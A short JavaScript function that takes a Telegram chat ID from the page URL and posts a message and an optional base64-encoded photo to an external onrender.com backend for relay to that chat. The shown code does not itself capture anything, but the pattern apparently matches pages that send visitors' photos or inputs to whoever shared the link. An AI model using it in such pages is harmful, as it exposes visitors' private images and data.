function sendToTelegram(message, photoBase64 = null) {
  const chatId = new URLSearchParams(window.location.search).get("id");
  if (!chatId) return console.error("No Telegram ID found in URL.");
  const payload = { chat_id: chatId, message };
  if (photoBase64) payload.photo = photoBase64;

  fetch("https://render-backend-package1.onrender.com/submit", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  })
    .then(res => res.ok ? console.log("Data sent to Telegram ✅") : console.error("Telegram error ❌"))
    .catch(err => console.error("Fetch error:", err));
}
